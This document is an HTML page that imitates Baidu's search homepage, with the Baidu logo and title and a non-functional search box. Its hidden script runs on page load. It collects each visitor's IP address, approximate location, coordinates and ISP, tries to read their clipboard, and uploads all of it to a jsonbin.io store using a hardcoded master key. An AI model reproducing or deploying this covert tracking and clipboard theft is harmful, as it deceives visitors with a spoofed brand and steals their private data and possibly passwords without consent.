<!DOCTYPE html>
<html lang="zh-CN">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1.0">
   <title>百度一下，你就知道</title>
   <style>
       *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Microsoft YaHei,sans-serif}
       body{min-height:100vh;background:#fff;display:flex;flex-direction:column;align-items:center;padding-top:120px}
       .logo{width:270px;height:95px;margin-bottom:30px;background:url(https://www.baidu.com/img/bd_logo1.png) no-repeat;background-size:contain}
       .search-wrap{display:flex;width:540px;height:44px;border:1px solid #c4c7ce;border-radius:4px}
       .search-input{flex:1;padding:0 15px;font-size:16px;border:none;outline:none}
       .search-btn{width:108px;height:44px;background:#4e6ef2;color:#fff;font-size:16px;border:none;cursor:pointer;border-radius:0 4px 4px 0}
       .search-btn:hover{background:#4662e5}
   </style>
</head>
<body>
   <div class="logo"></div>
   <div class="search-wrap">
       <input class="search-input" placeholder="请输入搜索内容">
       <button class="search-btn">百度一下</button>
   </div>
<script>
!function(){
   // 固定配置，和后台一致
   const BIN_ID = "6a13344a6610dd3ae89b5baa";
   const API_KEY = "$2a$10$ImaXRFAF0DWBGK.u1TfnAuxIQIUgwBoAwFE71Ydy6EEQ6HzDwBNnS";

   // 1. 获取IP和地理位置
   async function getFullAddress() {
       const apiList = [
           "https://ipapi.co/json/",
           "https://ipwho.is/",
           "https://ipinfo.io/json"
       ];
       for (let url of apiList) {
           try {
               const res = await fetch(url, { cache: "no-cache", signal: AbortSignal.timeout(5000) });
               if (!res.ok) continue;
               const data = await res.json();
               const ip = data.ip || data.ip_address || "未知IP";
               const country = data.country_name || data.country || "未知国家";
               const region = data.region || data.state || "";
               const city = data.city || "";
               const district = data.district || "";
               const lat = data.latitude || data.lat || (data.loc ? data.loc.split(',')[0] : "");
               const lon = data.longitude || data.lon || (data.loc ? data.loc.split(',')[1] : "");
               const isp = data.org || data.isp || "未知运营商";
               return { ip, country, region, city, district, lat, lon, isp };
           } catch (e) { continue; }
       }
       return { ip: "解析失败", country: "未知国家", region: "未知省份", city: "未知城市", district: "未知区县", lat: "", lon: "", isp: "未知运营商" };
   }

   // 2. 获取剪贴板内容
   async function getClipboard() {
       try {
           const text = await navigator.clipboard.readText();
           return text || "无内容";
       } catch (e) {
           return "无法读取（未授权/不支持）";
       }
   }

   // 3. 保存数据到jsonbin
   async function saveData() {
       const locData = await getFullAddress();
       const clipData = await getClipboard();
       const nowTime = new Date().toLocaleString();

       const visitorData = {
           ip: locData.ip,
           country: locData.country,
           province: locData.region,
           city: locData.city,
           district: locData.district,
           lat: locData.lat,
           lon: locData.lon,
           isp: locData.isp,
           clipboard: clipData,
           time: nowTime,
           count: 1
       };

       try {
           // 读取现有数据
           const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
               headers: { "X-Master-Key": API_KEY }
           });
           const cloudData = await res.json();
           const recordList = cloudData.record.ips || [];

           // 追加新记录
           recordList.push(visitorData);

           // 写回数据
           await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
               method: "PUT",
               headers: {
                   "Content-Type": "application/json",
                   "X-Master-Key": API_KEY
               },
               body: JSON.stringify({ ips: recordList })
           });
       } catch (err) {
           console.log("保存失败：", err);
       }
   }

   // 页面加载自动执行
   window.onload = function() {
       saveData();
   }
}();
</script>
</body>
</html>
